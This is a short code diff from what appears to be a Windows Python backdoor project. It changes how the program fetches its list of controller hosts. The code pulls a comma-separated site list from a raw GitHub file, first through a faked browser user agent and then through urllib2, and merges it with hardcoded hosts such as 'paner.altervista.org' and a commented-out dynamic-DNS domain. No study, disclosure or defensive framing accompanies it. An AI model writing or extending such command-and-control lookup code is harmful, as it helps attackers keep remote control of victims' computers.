@@ -10,14 +10,13 @@ from subprocess import Popen
 
 
 import socket
-from fake_useragent import UserAgent
-ua = UserAgent()
-#print(ua.chrome)
-header = {'User-Agent':str(ua.chrome)}
-mainsite = requests.get("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt", headers=header)
+
+
+
+mainsite = urllib2.urlopen("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt")
 #print mainsite.text
 sites = ["paner.altervista.org"]#, mainsite.text]
-sites.extend(mainsite.text.split(",") )
+sites.extend(mainsite.read().split(",") )
 
 #sites = ["paner.altervista.org", "verifiche.ddns.net"]
 #site="paner.altervista.org"
